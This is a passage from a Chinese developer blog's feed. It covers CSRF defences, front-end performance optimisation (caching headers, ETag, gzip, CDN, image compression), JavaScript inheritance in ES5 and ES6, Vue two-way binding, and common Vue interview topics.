title="CSRF防范"></a>CSRF防范</h3><p>1、验证码<br>从上面的例子可以看出，CSRF攻击往往是在用户不知情的情况下构造了网络请求，而验证码会强制用户与应用进行交互，才能最终完成并提交请求。</p><p>2、Referer Check<br>根据HTTP协议，在HTTP头部有一个字段叫 Referer ，它记录着HTTP请求的来源地址，通过它可以检查请求是否来自合法的源。因此要防范CSRF攻击，只需验证它的 Referer 值，如果是以相同域名开头的，就是来自网站自己的请求，是合法的，如果是来自其他网站的，可以拒绝该请求</p><p>3、添加token验证<br>CSRF攻击能成功的原因在于攻击者可以伪造用户请求，该请求中所有的用户验证信息都存在于cookie中，要抵御该攻击，关键是要在请求中放入攻击者不能伪造的信息，并且该信息不能存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证 token，从而判断是否是CSRF攻击</p><p>更多详细内容：<a href="https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>web前端性能优化</title>
      <link href="/2018/08/14/web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2018/08/14/web%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>从输入url到页面加载完成的过程分析前端可以做的优化<br><a id="more"></a></p><h2 id="1、发送HTTP请求，使用Cache-Control"><a href="#1、发送HTTP请求，使用Cache-Control" class="headerlink" title="1、发送HTTP请求，使用Cache-Control"></a>1、发送HTTP请求，使用Cache-Control</h2><p>通过在 HTTP 协议添加Cache-Control头部来告诉浏览器当前资源是否缓存，帮助浏览器进行有条件请求。Cache-Control 的值可以是 public, private, no-cache, no-store, no-transform 等</p><ul><li>max-age(单位为 s) 设定缓存最大的有效时间，Cache-Control: max-age=3600 表示该资源在浏览器端一个小时内均有效。</li><li>s-maxage(单位是 s) 设定共享缓存时间，比如 CDN 或者代理。</li><li>no-store 网络资源不缓存，每次都到服务器上拉取。</li><li>no-cache 表示网络资源可以缓存一份，但使用前必须询问服务器此资源是不是最新的。</li><li>public 表明响应可以被任何对象（客户端，代理服务器等）缓存。</li><li>private 表明响应只能被单个用户缓存，其它用户或者代理服务器不能缓存这些数据。</li></ul><h2 id="2、发送HTTP请求，增加域名以并行下载资源"><a href="#2、发送HTTP请求，增加域名以并行下载资源" class="headerlink" title="2、发送HTTP请求，增加域名以并行下载资源"></a>2、发送HTTP请求，增加域名以并行下载资源</h2><p>把组件分散到不同的域名下最大化并行下载数。</p><p>但是对于需要减少DNS查询来说，就要减少域名，想增加HTTP请求的并发数又要增加域名，两者产生矛盾。权衡之下，如果文件很少，就没有必要增加域名；反之，就增加域名。基于DNS查询的副作用，最佳的不同域名数是2-4。</p><h2 id="3、接收响应时，使用Etag"><a href="#3、接收响应时，使用Etag" class="headerlink" title="3、接收响应时，使用Etag"></a>3、接收响应时，使用Etag</h2><p>Etag是服务器和浏览器之间判断浏览器缓存中某个组件是否未发生改变的一种机制，服务器像下面这样设置Etag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Last-Modified: Tue, 12 Dec 2006 03:03:59 GMT</span><br><span class="line">ETag: &quot;10c24bc-4ab-457e1c1f&quot;  // md5</span><br><span class="line">Content-Length: 12195</span><br></pre></td></tr></table></figure></p><p>之后，当浏览器要验证该组件是否修改过，会在请求头里设置if-None-Match，并附上这个md5值。于是在请求的时候，如果这个md5值和你之前文件的md5值一样，说明文件没有更新，不需要下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /i/yahoo.gif HTTP/1.1</span><br><span class="line">Host: us.yimg.com</span><br><span class="line">If-Modified-Since: Tue, 12 Dec 2006 03:03:59 GMT</span><br><span class="line">If-None-Match: &quot;10c24bc-4ab-457e1c1f&quot;  // 与原文件相同，返回304</span><br><span class="line">HTTP/1.1 304 Not Modified</span><br></pre></td></tr></table></figure></p><p>Etag和缓存的区别在于：缓存不会发请求，而ETag会发请求，并比较md5值是否一样，从而返回304。</p><h2 id="4、接收响应时，使用Gzip压缩"><a href="#4、接收响应时，使用Gzip压缩" class="headerlink" title="4、接收响应时，使用Gzip压缩"></a>4、接收响应时，使用Gzip压缩</h2><p>传输时用Gzip压缩，压缩可以通过减少http响应的大小减少响应时间。从HTTP/1.1开始，客户端通过http请求中的Accept-Encoding头部来提示支持的压缩：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure></p><p>如果服务器看到这个头部，它可能会选用列表中的某个方法压缩响应。服务器通过Content-Encoding头部提示客户端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br></pre></td></tr></table></figure></p><p>gzip一般可减小响应的70%。尽可能去压缩更多类型的文件。html，脚本，样式，xml和json等等都应该被压缩，而图片，pdf等等不应该被gzip，因为它们本身已被压缩过。</p><h2 id="5、对于CSS和JS文件，使用CDN（Content-Delivery-Network）"><a href="#5、对于CSS和JS文件，使用CDN（Content-Delivery-Network）" class="headerlink" title="5、对于CSS和JS文件，使用CDN（Content Delivery Network）"></a>5、对于CSS和JS文件，使用CDN（Content Delivery Network）</h2><p>用户离服务器越近，会减少响应时间。CDN是一群不同地点的服务器，它将资源分布到世界各地，这样不同地点的人会根据距离选择离得最近的服务器，从而使页面加载更快</p><h2 id="6、调整CSS和JS文件位置"><a href="#6、调整CSS和JS文件位置" class="headerlink" title="6、调整CSS和JS文件位置"></a>6、调整CSS和JS文件位置</h2><p>将CSS放在头部，让它能够尽早下载；JS放在body最后，确保JS不会阻塞HTML加载，以保证用户先看到一个完整画面</p><p>对于CSS文件来说，IE不会阻塞HTML，会在看到标签时就渲染在页面上，回头等CSS加载完后，再次重新渲染页面；而Chrome会阻塞HTML，它会在CSS下载好之后再渲染标签。所以最好的方式是将CSS文件放在一开始就需要加载的位置上</p><p>对于JS文件，不管是IE还是Chrome，它都会阻塞HTML的渲染，所以干脆将它放在body最后，让它最后一个加载。</p><h2 id="7、压缩图片"><a href="#7、压缩图片" class="headerlink" title="7、压缩图片"></a>7、压缩图片</h2><p><1> 优化jpg和png</1></p><p>使用 pngcrush 或其它工具压缩png<br>使用 jpegtran 或其它工具压缩jpeg</p><p>如果真的需要追求各种图片的极限压缩，可以参阅这些工具的文档，但是对于一般的Web应用，面对的图片种类多样，几乎不可能在工程中实现对每种工具的独立配置，因此推荐使用以下工具来进行优化。</p><ul><li>ImageOptim (Mac) 主页：<a href="https://imageoptim.com/" target="_blank" rel="noopener">https://imageoptim.com/</a><br>Mac平台下非常赞的图片优化工具，只需要把需要优化的图片拖拽进ImageOptim，就能够完成对图片的优化。设置选择的也很丰富，目前支持JPG和PNG的优化。</li><li>Kraken (Web) 主页：<a href="https://kraken.io/" target="_blank" rel="noopener">https://kraken.io/</a><br>在免费模式下可以上传图片，优化后打包下载。适合偶尔有图片优化需求，或者不在开发机上没有优化软件可以使用的情况。</li><li>智图 (Web) 主页：<a href="http://zhitu.tencent.com/" target="_blank" rel="noopener">http://zhitu.tencent.com/</a><br>腾讯ISUX团队有篇文章介绍智图：<a href="http://isux.tencent.com/zhitu.html" target="_blank" rel="noopener">http://isux.tencent.com/zhitu.html</a></li></ul><p><2> 优化SVG</2></p><p>SVGO 工具可以缩减SVG文件的体积；由于SVG是基于XML的格式，本质上是纯文本，所以还可以采用GZIP压缩来减小传输大小，但这需要一些服务器配置。</p><h3 id="自动优化"><a href="#自动优化" class="headerlink" title="自动优化"></a>自动优化</h3><p>主要介绍CDN、Grunt/Gulp、Google PageSpeed三种方式。</p><p>1、CDN</p><p>CDN七牛和又拍在这方面都做了大量工作。其工作方式为，向CDN请求图片的URL参数中包含了图片处理的参数（格式、宽高等），CDN服务器根据请求生成所需的图片，发送到用户浏览器。</p><p>七牛云存储的图片处理接口极其丰富，覆盖了图片的大部分基本操作，例如：</p><ul><li>图片裁剪，支持多种裁剪方式（如按长边、短边、填充、拉伸等）</li><li>图片格式转换，支持JPG, GIF, PNG, WebP等，支持不同的图片压缩率</li><li>图片处理，支持图片水印、高斯模糊、重心处理等</li></ul><p>2、Grunt/Gulp</p><p>用于图片优化的Grunt组件：grunt-image。前端工程师的重复性工作，例如合并静态资源、压缩JS和CSS文件、编译SASS等都可以使用Grunt等自动化工具批量完成，图片优化也是如此。</p><p>grunt-image非常强大，按照作者的介绍，其内部加载的图片优化工具包括了pngquant, optipng, advpng, zopflipng, pngcrush, pngout, mozjpeg, jpegRecompress, jpegoptim, gifsicle和svgo。支持批量自动优化PNG, JPG, SVG和GIF，速度也不错，配置方式支持单图片优化和全目录优化</p><p>3、Google PageSpeed</p><p>Google PageSpeed这个服务器模块，可以在apache或ngnix中加载，通过在服务器配置文件中进行设置来进行自动化的优化。对于图片格式转换、图片优化甚至图片LazyLoad都有相关选项。</p>]]></content>
      
      
        <tags>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>如何实现继承</title>
      <link href="/2018/08/13/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF/"/>
      <url>/2018/08/13/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ES5与ES6的两种写法<br><a id="more"></a></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>使得子类具有父类别的各种属性和方法叫做继承</p><h2 id="ES5实现继承"><a href="#ES5实现继承" class="headerlink" title="ES5实现继承"></a>ES5实现继承</h2><p>父类：Human<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Human(name)&#123;</span><br><span class="line">    this.name = name  // 父类的自有属性</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Human.prototype.run = function()&#123;  // 原型上的公有属性</span><br><span class="line">    console.log(&quot;我叫&quot; + this.name + &quot;，我在跑&quot;)</span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/08/13/5b719b02c3022.jpg" alt="alt text"></p><p>子类：Man<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Man(name)&#123;</span><br><span class="line">    Human.call(this.name)  // 1、调用父类Human，拥有this.name = name的属性</span><br><span class="line">    this.gender = &apos;男&apos;  // 子类的自有属性</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Man.prototype.__proto__ = Human.prototype  // 2、将Man的原型 链到 Human的原型上</span><br><span class="line"></span><br><span class="line">Man.prototype.fight = function()&#123;  // 子类原型上的公有属性</span><br><span class="line">    console.log(&apos;捶你胸口&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/08/13/5b719b024ce95.png" alt="alt text"></p><p>但是由于IE不支持第二句Man.prototype.<strong>proto</strong> = Human.prototype，用下面三句话可以代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var f = function()&#123;&#125;  // 构造空函数</span><br><span class="line">f.prototype = Human.prototype  // 让空函数的原型指向Human（父类）的原型</span><br><span class="line">Man.prototype = new f()  // 此时f()就是去掉了 this.name = name 的Human</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/08/13/5b719b02c1604.png" alt="alt text"></p><p>使用new命令相当于执行了下面四步：</p><ul><li>创建一个临时空对象作为要返回的对象实例  var temp = {}</li><li>将这个空对象的原型指向构造函数的prototype属性  this.<strong>proto</strong> = 构造函数.prototype</li><li>将这个空对象赋值给函数内部的this关键字  this = temp</li><li>执行构造函数内部代码，并返回this  return this</li></ul><p>prototype属性只有一个功能就是存放公有属性对象的地址<br><img src="https://i.loli.net/2018/08/13/5b714f47880d3.png" alt="alt text"></p><h2 id="ES6实现继承"><a href="#ES6实现继承" class="headerlink" title="ES6实现继承"></a>ES6实现继承</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">父类：Human</span><br><span class="line">class Human &#123;</span><br><span class="line">    constructor(name)&#123;</span><br><span class="line">        this.name = name  // 自有属性</span><br><span class="line">    &#125;</span><br><span class="line">    run()&#123;  // 公有属性，直接写在原型链（prototype）上的</span><br><span class="line">        console.log(&quot;我叫&quot; + this.name + &quot;，我在跑&quot;)</span><br><span class="line">        return undefined</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">子类：Man</span><br><span class="line">class Man extends Human &#123;  // extends关键字等价于 Man.prototype.__proto__ = Human.prototype</span><br><span class="line">    constructor(name)&#123;</span><br><span class="line">        super(name)  // 调用父类，等价于Human.call(this, name)使得子类拥有this.name = name的属性</span><br><span class="line">        this.gender = &apos;男&apos;  // 子类的自有属性</span><br><span class="line">    &#125;</span><br><span class="line">    fight()&#123;</span><br><span class="line">        console.log(&apos;捶你胸口&apos;)  // 子类的公有属性，写在Man.prototype上的</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有了ES6的extends写法，我们构造函数与函数的继承显得十分简单，它帮我们省去了链接原型到另一个原型的复杂步骤，但是它不能帮助我们很好的理解js的原型以及继承的原理，所以真正搞懂ES5的继承写法会让你对原型的理解有很深刻的挖掘</p>]]></content>
      
      
        <tags>
            
            <tag> 继承 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vue的双向绑定</title>
      <link href="/2018/08/11/vue%E7%9A%84%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/"/>
      <url>/2018/08/11/vue%E7%9A%84%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>MVVM模式的体现<br><a id="more"></a></p><h2 id="vue双向绑定"><a href="#vue双向绑定" class="headerlink" title="vue双向绑定"></a>vue双向绑定</h2><h3 id="原理（采用Object-defineProperty-数据劫持-发布订阅模式）"><a href="#原理（采用Object-defineProperty-数据劫持-发布订阅模式）" class="headerlink" title="原理（采用Object.defineProperty()数据劫持 + 发布订阅模式）"></a>原理（采用Object.defineProperty()数据劫持 + 发布订阅模式）</h3><p>通过ES5提供的Object.defineProperty()方法，监控对数据的操作（劫持各个属性的setter、getter，在数据变动时发布消息给订阅者，触发相应的监听回调），从而自动触发数据同步。并且由于是在不同的数据上触发同步，可以精确地将变更发送给绑定的视图，而不是对所有数据都进行一次检测。简单应用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;;</span><br><span class="line">Object.defineProperty(obj, &apos;hello&apos;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">        console.log(&apos;get方法获取值&apos;);</span><br><span class="line">    &#125;,</span><br><span class="line">    set: function(val) &#123;</span><br><span class="line">        console.log(&apos;set方法设置的值为：&apos; + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.hello; // get方法获取值</span><br><span class="line">obj.hello = &apos;Hello World&apos;;</span><br></pre></td></tr></table></figure></p><p>Object.defineProperty()函数接受三个参数，且都是必须的：</p><ul><li>第一个参数：目标对象</li><li>第二个参数：需要定义的属性或方法的名字。</li><li>第三个参数：目标属性所拥有的特性。</li></ul><h3 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h3><ul><li>需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化</li><li>compile解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图</li><li>Watcher订阅者是Observer和Compile之间通信的桥梁，主要做的事情是:</li></ul><p>1、在自身实例化时往属性订阅器(dep)里面添加自己</p><p>2、自身必须有一个update()方法</p><p>3、待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。</p><ul><li>MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。</li></ul><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>假如我们要实现一个用户在输入框输入内容，页面上会自动更新的效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;input v-model=&quot;message&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">JS:</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el:&apos;app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message:&apos;Hello,this is Jayce!&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>v-model只是一个语法糖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model=&quot;x&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>相当于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-bind:value=&quot;x&quot; @input=&quot;x = $event&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>原理是绑定了一个input事件，将x的值传递给子组件，如果子组件的值更新了，它会发出一个input事件，input会传来x最新的值，再将这个最新的值event赋值给x，从而实现双向绑定</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>双向绑定给人最大的优越感就是方便，当data发生变化时，页面也会自动更新，但这也伴随着一个缺点，我们无从知道data是什么时候变的，是谁变的，变化后也没有人来通知你，虽然说watch可以用来监听data的变化，但这样岂不是变得更复杂，不如用单向数据绑定，Vuex的单向数据绑定就满足了这种控制欲，虽然牺牲了一部分便捷性，但是换来的却是更强的控制力。</p>]]></content>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vue常见知识点</title>
      <link href="/2018/08/11/vue%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2018/08/11/vue%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>梳理知识点<br><a id="more"></a></p><h2 id="vue框架与jQuery的区别"><a href="#vue框架与jQuery的区别" class="headerlink" title="vue框架与jQuery的区别"></a>vue框架与jQuery的区别</h2><p>jQuery是使用选择器（$）选取DOM对象，对其进行赋值、取值、事件绑定等操作，和原生的HTML的区别只在于可以更方便的选取和操作DOM对象，而数据和界面是在一起的。比如需要获取label标签的内容：$(“lable”).val(); 它还是依赖DOM元素的值。</p><p>Vue使用MVVM模式，通过数据来显示视图层而不是节点操作，主要业务逻辑都放在viewModel中，视图和数据不直接进行数据交流</p><h2 id="一个组件实例"><a href="#一个组件实例" class="headerlink" title="一个组件实例"></a>一个组件实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&apos;定义一个组件名,组件名最好是带小横线的写法，尽量不要使用驼峰命名法button-counter&apos;, &#123;</span><br><span class="line">    data: function() &#123;  // data必须返回一个函数</span><br><span class="line">        return &#123;</span><br><span class="line">            count: 0</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: `  // 模版下只能有一个根元素</span><br><span class="line">    &lt;button @click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125;times.&lt;/button&gt;</span><br><span class="line">    `</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>将这个组件作为自定义元素使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;div id=&quot;components-demo&quot;&gt;</span><br><span class="line">  &lt;button-counter&gt;&lt;/button-counter&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">JS:</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el: &apos;#components-demo&apos;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="实例生命周期钩子"><a href="#实例生命周期钩子" class="headerlink" title="实例生命周期钩子"></a>实例生命周期钩子</h2><p>1、什么是生命周期</p><p>每个Vue实例从创建到销毁的过程就是生命周期，它的经历包括开始创建、初始化数据、编译模版、挂载到DOM、渲染更新、卸载。可以分为10个阶段：创建前/后（create），挂载前/后（mount）、更新前/后（update）、启动前/后（active）、销毁前/后（destroy）</p><p>2、生命周期函数的作用</p><p>生命周期中有许多事件钩子，让我们在控制整个Vue实例的过程中更容易形成好的逻辑</p><ul><li>created 实例创建完成后调用，此阶段完成了数据的观测等，但尚未挂载， $el 还不可用。需要初始化处理一些数据时会比较有用 —-还未挂载</li><li>mounted el 挂载到实例上后调用，一般我们的第一个业务逻辑会在这里开始 。相当于 $(document).ready() —刚刚挂载</li><li>beforeDestroy 实例销毁之前调用。主要解绑一些使用 addEventListener 监听的事件等。</li></ul><p>3、第一次页面加载会触发哪几个钩子？DOM渲染在哪个周期就完成了？</p><p>第一次页面加载会触发beforeCreate、created、beforeMount、mounted这四个钩子</p><p>DOM渲染在mounted中就已完成</p><h2 id="computed计算属性的用法？与methods的区别"><a href="#computed计算属性的用法？与methods的区别" class="headerlink" title="computed计算属性的用法？与methods的区别"></a>computed计算属性的用法？与methods的区别</h2><p>官方解释：对于复杂的逻辑我们应该用计算属性，例如想多次引用一个翻转字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">&lt;div id=&quot;demo&quot;&gt;</span><br><span class="line">  &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;Reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">JS:</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">  el: &apos;demo&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &apos;Hello&apos;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    reversedMessage: function()&#123;</span><br><span class="line">      return this.message.split(&apos;&apos;).reverse().join(&apos;&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>与methods的区别：</p><ul><li>两种方式的最终结果是一致的，但唯一不同的是计算属性是基于它们的依赖进行缓存的，也就是说只有在他的相关依赖发生改变时才会重新求值，而调用方法总是会在触发重新渲染时再次执行函数</li><li><p>当有一个性能开销巨大的项目时，它需要计算属性A，它需要遍历一个巨大的数组并且进行大量的运算，也有可能一些其他的计算属性依赖于属性A，假如没有缓存，每次调用属性都会重新对A进行一次计算，如果不希望有这些缓存，那么就可以用methods来代替</p><h2 id="v-if与v-show"><a href="#v-if与v-show" class="headerlink" title="v-if与v-show"></a>v-if与v-show</h2><p>1、区别</p></li><li><p>手段：v-if是动态的向DOM树内添加或者删除DOM元素；v-show是通过设置DOM元素的display样式属性控制显隐；</p></li><li>编译条件：v-if是惰性的，如果初始条件为假，则什么也不做，直到条件第一次变为真时，才会开始渲染条件块; v-show不管初始条件是什么，元素总是会被渲染，然后被缓存，而且DOM元素保留；</li><li>编译过程：v-if切换有一个局部编译/卸载的过程，它会在切换过程中合适地销毁和重建内部的事件监听和子组件；v-show只是简单的基于css切换；</li><li>性能消耗：v-if有更高的切换消耗；v-show有更高的初始渲染消耗；</li></ul><p>2、使用场景</p><p>v-if适合运行条件不大可能会改变；v-show适合频繁切换</p><ul><li>对于管理系统的权限列表的展示，可以使用v-if来渲染，如果用到v-show，对于用户没有的权限，在网页的源码中，仍然能够显示出该权限，如果用v-if，网页的源码中就不会显示出该权限。（在前后台分离情况下，后台不负责渲染页面的场景。）</li><li>对于前台页面的数据展示，推荐使用v-show，这样可以减少开发中不必要的麻烦。</li></ul><p>3、总结</p><p>两者都是用来控制元素的渲染。v-if会判断是否需要加载，只在需要时加载可减轻服务器压力，但具有更高的切换开销；v-show通过改变DOM元素的CSS的display属性，可以使用户操作更加流畅，但有更高的初始渲染开销。如果需要频繁切换状态就用v-show，若运行条件很少会改变，用v-if较好</p><h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><p>1、官方定义：专门为Vue.js应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p><p>2、Vuex解决了什么问题</p><ul><li>组件之间的数据通信</li><li>使用单向数据流的方式进行数据的中心化管理（所谓的单向数据流，就是当用户进行操作的时候，会从组件发出一个 action，这个 action 流到 store 里面，触发 store 对状态进行改动，然后 store 又触发组件基于新的状态重新渲染）对于复杂的应用来说，Vuex实施统一管理，方便维护和跟踪</li></ul><p>3、举例说明Vuex的好处（反证法）</p><p>我们不好说为什么使用Vuex，但是如果在下面这种情况下不使用Vuex，将会带来很多弊端</p><p>假设在一个app里有四个tab，每个tab都需要获取用户的资料，如果数据在每个tab组件里都保存了一份，那么用户在手动更新了资料后，这四个tab都需要更新一遍用户资料来保证用户在每个地方看到的数据永远都是最新的。如果说每进一次tab都重新请求一下：</p><p>对于服务器来说，频繁请求数据会耗用很多资源，如果该app的用户数量足够多，那么每多出来的一次请求，对于公司来说都是一笔巨大的开支，但是如果数据都储存在store中，并且这四个tab读取的都是同一份数据，那么在用户更新了资料时，只需要更新store中的数据，这样在进这四个不同的tab时，就减少了四次请求</p><h2 